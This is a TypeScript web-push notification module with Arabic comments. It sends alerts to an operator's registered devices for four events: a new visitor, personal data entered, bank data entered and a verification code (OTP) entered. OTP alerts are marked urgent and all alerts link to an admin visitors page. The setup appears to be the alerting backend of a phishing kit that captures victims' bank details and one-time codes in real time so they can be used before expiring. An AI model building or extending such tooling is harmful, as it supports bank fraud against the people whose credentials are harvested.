// Push Notifications Service - يعمل حتى مع إغلاق المتصفح
// يستخدم Web Push API عبر مكتبة web-push
import webpush from "web-push";
import { db, trustedDevicesTable } from "@workspace/db";
import { eq } from "drizzle-orm";

// ─── أنواع الإشعارات ─────────────────────────────────────────────────────
export type NotificationEvent = "visitor" | "personal" | "bank" | "otp";

export interface PushPayload {
  title: string;
  body: string;
  icon?: string;
  badge?: string;
  tag?: string;
  sound?: string;
  data?: {
    eventType: NotificationEvent;
    sessionId?: string;
    applicantName?: string;
    url?: string;
    timestamp: number;
  };
}

// ─── إعدادات VAPID من Environment ─────────────────────────────────────────
const VAPID_PUBLIC_KEY = process.env.VAPID_PUBLIC_KEY?.trim() || "";
const VAPID_PRIVATE_KEY = process.env.VAPID_PRIVATE_KEY?.trim() || "";

// التحقق من إعدادات VAPID
const VAPID_IS_VALID = Boolean(
  VAPID_PUBLIC_KEY && 
  VAPID_PUBLIC_KEY.length > 50 &&
  VAPID_PRIVATE_KEY &&
  VAPID_PRIVATE_KEY.length > 50
);

// إعداد web-push مع VAPID
if (VAPID_IS_VALID) {
  webpush.setVapidDetails(
    "mailto:notifications@jazeera-finance.com",
    VAPID_PUBLIC_KEY,
    VAPID_PRIVATE_KEY
  );
  console.log("✅ [WebPush] VAPID keys configured");
  console.log(`   Public key length: ${VAPID_PUBLIC_KEY.length}`);
} else {
  console.log("⚠️ [WebPush] VAPID keys not configured or invalid");
  console.log("   VAPID_PUBLIC_KEY:", VAPID_PUBLIC_KEY ? `set (${VAPID_PUBLIC_KEY.length} chars)` : "missing");
  console.log("   VAPID_PRIVATE_KEY:", VAPID_PRIVATE_KEY ? `set (${VAPID_PRIVATE_KEY.length} chars)` : "missing");
}

// ─── رسائل الإشعارات ────────────────────────────────────────────────────
const notificationMessages: Record<NotificationEvent, { title: string; body: string; sound?: string }> = {
  visitor: {
    title: "🆕 زائر جديد!",
    body: "زائر جديد دخل الموقع",
    sound: "default",
  },
  personal: {
    title: "👤 بيانات شخصية",
    body: "تم إدخال بيانات شخصية جديدة",
    sound: "default",
  },
  bank: {
    title: "🏦 بيانات البنك",
    body: "تم إدخال بيانات البنك - راجع الآن!",
    sound: "default",
  },
  otp: {
    title: "🔐 رمز تحقق!",
    body: "تم إدخال رمز التحقق - راجع الآن!",
    sound: "default",
  },
};

// ─── إرسال إشعار لجميع الأجهزة الموثوقة عبر Web Push ─────────────────────
export async function sendPushNotification(eventType: NotificationEvent, extraData?: { sessionId?: string; applicantName?: string }) {
  const message = notificationMessages[eventType];
  
  // تحديد لون الإشعار حسب النوع
  const eventColors: Record<NotificationEvent, string> = {
    visitor: "#10b981",   // أخضر
    personal: "#3b82f6",  // أزرق
    bank: "#f59e0b",      // برتقالي
    otp: "#ef4444",       // أحمر (عاجل)
  };

  const title = message.title;
  const body = extraData?.applicantName 
    ? `${extraData.applicantName} - ${message.body}`
    : message.body;

  console.log(`📱 [WebPush] Event: ${eventType}`);
  console.log(`📱 [WebPush] Title: ${title}`);
  console.log(`📱 [WebPush] Body: ${body}`);

  // ─── التحقق من إعدادات VAPID ────────────────────────────────────────────
  if (!VAPID_IS_VALID) {
    console.error("📱 [WebPush] ❌ VAPID keys not configured!");
    return { successful: 0, failed: 0, error: "VAPID not configured" };
  }

  try {
    // ─── جلب جميع الأجهزة مع اشتراك Push ────────────────────────────────
    console.log("📱 [WebPush] Querying all devices from database...");
    
    const allDevices = await db.select().from(trustedDevicesTable);
    
    console.log(`📱 [WebPush] Total devices in DB: ${allDevices.length}`);
    console.log(`📱 [WebPush] Devices with isActive=true: ${allDevices.filter(d => d.isActive).length}`);
    console.log(`📱 [WebPush] Devices with push_subscription: ${allDevices.filter(d => d.pushSubscription).length}`);
    
    const devicesWithPush = allDevices.filter(d => {
      const hasPush = Boolean(d.pushSubscription);
      const isActive = d.isActive !== false;
      return hasPush && isActive;
    });
    
    console.log(`📱 [WebPush] Devices eligible for push: ${devicesWithPush.length}`);

    if (devicesWithPush.length === 0) {
      console.log("📱 [WebPush] No eligible devices for push notifications");
      return { successful: 0, failed: 0 };
    }

    console.log(`📱 [WebPush] Sending to ${devicesWithPush.length} devices`);

    // ─── إرسال لجميع الأجهزة عبر web-push ──────────────────────────────
    const results = await Promise.allSettled(
      devicesWithPush.map(async (device) => {
        try {
          // تحويل الـ subscription إلى object
          let subscriptionData: webpush.PushSubscription;
          
          if (typeof device.pushSubscription === 'string') {
            subscriptionData = JSON.parse(device.pushSubscription);
          } else if (typeof device.pushSubscription === 'object' && device.pushSubscription !== null) {
            subscriptionData = device.pushSubscription as webpush.PushSubscription;
          } else {
            throw new Error(`Invalid pushSubscription type: ${typeof device.pushSubscription}`);
          }
          
          console.log(`📱 [WebPush] Sending to device: ${device.deviceId}`);
          console.log(`📱 [WebPush] Endpoint: ${subscriptionData.endpoint?.substring(0, 50)}...`);

          // إنشاء payload الإشعار
          const notificationPayload = JSON.stringify({
            title: title,
            body: body,
            icon: "/icons/icon-512x512.png",
            badge: "/icons/badge-72.png",
            tag: `event-${eventType}`,
            data: {
              eventType,
              sessionId: extraData?.sessionId || "",
              applicantName: extraData?.applicantName || "",
              url: "/admin/visitors",
              timestamp: Date.now(),
            },
            dir: "rtl",
            lang: "ar",
            renotify: true,
            requireInteraction: eventType === "otp",
            vibrate: [200, 100, 200, 100, 200],
            actions: [
              { action: "open", title: "📱 فتح" },
              { action: "dismiss", title: "❌ تجاهل" },
            ],
          });

          // ─── إرسال عبر web-push ──────────────────────────────────────────
          const response = await webpush.sendNotification(
            subscriptionData,
            notificationPayload
          );

          console.log(`📱 [WebPush] ✅ Success for device: ${device.deviceId}`);
          
          // ─── تحديث lastUsedAt ──────────────────────────────────────────
          await db
            .update(trustedDevicesTable)
            .set({ lastUsedAt: new Date() })
            .where(eq(trustedDevicesTable.id, device.id));

          return { deviceId: device.deviceId, success: true };

        } catch (err: any) {
          const error = err as Error;
          const statusCode = error.statusCode || error.status;
          const errorMessage = error.body || error.message;
          
          console.error(`📱 [WebPush] ❌ Failed for device ${device.deviceId}:`, errorMessage);
          console.error(`📱 [WebPush]    Status: ${statusCode || 'unknown'}`);

          // إذا كان الـ token منتهي (404 أو 410)، احذف الاشتراك
          if (statusCode === 404 || statusCode === 410 || 
              errorMessage?.includes("404") || errorMessage?.includes("410")) {
            console.log(`📱 [WebPush] Token expired (${statusCode || 'not found'}), deactivating device: ${device.deviceId}`);
            await db
              .update(trustedDevicesTable)
              .set({ 
                isActive: false,
                pushSubscription: null 
              })
              .where(eq(trustedDevicesTable.id, device.id));
          }
          
          return { deviceId: device.deviceId, success: false, error: errorMessage };
        }
      })
    );

    const successful = results.filter(r => r.status === "fulfilled" && (r.value as {success: boolean}).success).length;
    const failed = results.filter(r => !r.status || (r.status === "fulfilled" && !(r.value as {success: boolean}).success)).length;
    
    console.log(`📱 [WebPush] Complete: ${successful} success, ${failed} failed`);
    
    return { successful, failed };
    
  } catch (err) {
    const error = err as Error;
    console.error("📱 [WebPush] Fatal error:", error.message);
    return { successful: 0, failed: 0, error: error.message };
  }
}

// ─── للتوافق مع الكود القديم ──────────────────────────────────────────────
export function saveSubscription(endpoint: string, sub: any) {
  console.log(`📱 [WebPush] New subscription saved`);
  console.log(`📱 [WebPush] Endpoint: ${endpoint?.substring(0, 80)}...`);
}

export function removeSubscription(endpoint: string) {
  console.log(`📱 [WebPush] Remove subscription: ${endpoint?.substring(0, 50)}...`);
}

// تصدير للتحقق
export function isWebPushConfigured(): boolean {
  return VAPID_IS_VALID;
}
